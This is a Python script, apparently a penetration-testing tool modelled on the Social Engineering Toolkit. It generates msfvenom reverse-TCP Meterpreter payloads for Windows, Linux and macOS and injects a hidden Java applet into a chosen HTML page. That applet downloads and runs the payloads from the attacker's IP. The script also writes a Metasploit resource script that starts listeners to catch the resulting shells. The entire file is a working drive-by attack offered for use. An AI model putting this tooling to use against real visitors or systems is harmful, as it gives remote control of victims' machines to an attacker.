#!/usr/bin/env python

# This program was heavily inspired by the Social Engineering Toolkit's Java applet web attack.
# It was written in a desire to deal with the constent stability issues encountered in SET.

from __future__ import with_statement
import os
import shutil
import sys
import re
import getopt

WINDOWS_DEFAULT = 'windows/meterpreter/reverse_tcp'
LINUX_DEFAULT = 'linux/x86/meterpreter/reverse_tcp'
OSX_DEFAULT = 'osx/x86/shell_reverse_tcp'

WINDOWS_PORT = 3000
LINUX_PORT = 3001
OSX_PORT = 3002

# This applet template was taken directly from SET's code.
# https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/webattack/web_clone/applet.database
APPLET_TEMPLATE = '<applet code="Java.class" width="1" height="1" archive="applet.jar"><param name="name"><param name="1" value="http://ipaddrhere/msf.exe"><param name="2" value=""><param name="3" value="http://ipaddrhere/mac.bin"><param name="4" value="http://ipaddrhere/nix.bin"><param name="5" value=""><param name="6" value=""><param name="7" value="freehugs"><param name="8" value="YES"><param name="9" value=""><param name="10" value=""><param name="separate_jvm" value="true"></applet>'

def print_usage():
    print """
Usage:
  {prog} [-w <payload>] [-l <payload>] [-m <payload>] <html_file> <ip>
  {prog} -h

Options:
  -h            Shows this help message.
  -w            Specifies the Windows payload to use. [default: {windows}]
  -l            Specifies the Linux payload to use. [default: {linux}]
  -m            Specifies the Mac OS X payload to use. [default: {osx}]
  <payload>     The payload string as expected by msfvenom. Run `msfvenom -l payloads` to see all choices.
  <html_file>   The HTML file to insert the Java payload.
  <ip>          The IP address the payload should connect back to.

Note: The default ports used for the Windows, Linux, and Mac listeners are 3000, 3001, and 3002 respectively.
""".format(prog=sys.argv[0], windows=WINDOWS_DEFAULT, linux=LINUX_DEFAULT, osx=OSX_DEFAULT)

def perform_checks():
  try:
    os.mkdir('output')
  except OSError:
    pass
  if not os.path.isdir('output'):
    print 'Unable to create output directory. Please ensure that the current directory.'
    return False
  return True

if __name__ == '__main__':
  if not perform_checks():
    sys.exit()

  # Accept -h -w -l and -m options and make -w -l and -m require an argument.
  optlist, args = getopt.getopt(sys.argv[1:], 'hw:l:m:')
  if len(args) < 2:
    print_usage()
    print 'Error: You did not specify a required argument. Please specify an html file to modify and an IP address to connect back to.'
    sys.exit()

  html_filename = args[0]
  ip_address = args[1]

  windows = WINDOWS_DEFAULT
  linux = LINUX_DEFAULT
  osx = OSX_DEFAULT

  for opt, arg in optlist:
    if opt == '-h':
      print_usage()
      sys.exit()
    elif opt == '-w':
      windows = arg
    elif opt == '-l':
      linux = arg
    elif opt == '-m':
      osx = arg

  print 'Generating Windows payload...'
  os.system('msfvenom -p {payload} -f exe LHOST={ip} LPORT={port} > {output} 2> /dev/null'.format(payload=windows, ip=ip_address, port=WINDOWS_PORT, output=os.path.join('output', 'msf.exe')))
  print 'Generating Linux payload...'
  os.system('msfvenom -p {payload} -f elf LHOST={ip} LPORT={port} > {output} 2> /dev/null'.format(payload=linux, ip=ip_address, port=LINUX_PORT, output=os.path.join('output', 'nix.bin')))
  print 'Generating Mac OS X payload...'
  os.system('msfvenom -p {payload} -f elf LHOST={ip} LPORT={port} > {output} 2> /dev/null'.format(payload=osx, ip=ip_address, port=OSX_PORT, output=os.path.join('output', 'mac.bin')))

  print 'Weaponizing html...'
  shutil.copy('applet.jar', 'output')

  with open(html_filename, 'r') as html_infile:
    with open(os.path.join('output', 'index.html'), 'w') as html_outfile:
      html = html_infile.read()
      applet_code = re.sub('ipaddrhere', ip_address, APPLET_TEMPLATE)
      weaponized_html = re.sub('</body>', applet_code + '\n</body>', html, re.I)
      html_outfile.write(weaponized_html)

  print 'Creating listener resource script...'
  with open(os.path.join('output', 'listeners.rc'), 'w') as resource_file:
    resource_file.write("""\
use exploit/multi/handler
set PAYLOAD {windows_payload}
set LHOST {ip_address}
set LPORT {windows_port}
set ExitOnSession False
exploit -j

set PAYLOAD {linux_payload}
set LHOST {ip_address}
set LPORT {linux_port}
set ExitOnSession False
exploit -j

set PAYLOAD {osx_payload}
set LHOST {ip_address}
set LPORT {osx_port}
set ExitOnSession False
exploit -j

sleep 1
echo "You may now surf to http://{ip_address}/"
""".format(
    ip_address=ip_address,
    windows_payload=windows,
    linux_payload=linux,
    osx_payload=osx,
    windows_port=WINDOWS_PORT,
    linux_port=LINUX_PORT,
    osx_port=OSX_PORT,
  ))

  print 'All output written to the "output" directory.'
  print
  print 'Start your Metasploit listeners using the command: msfconsole -r output/listeners.rc'
  print 'Then copy the remaining files in your output directory to your web root (usually /var/www/).'
  print 'Alternatively, start a lightweight webserver using the command: cd output && python -m SimpleHTTPServer'
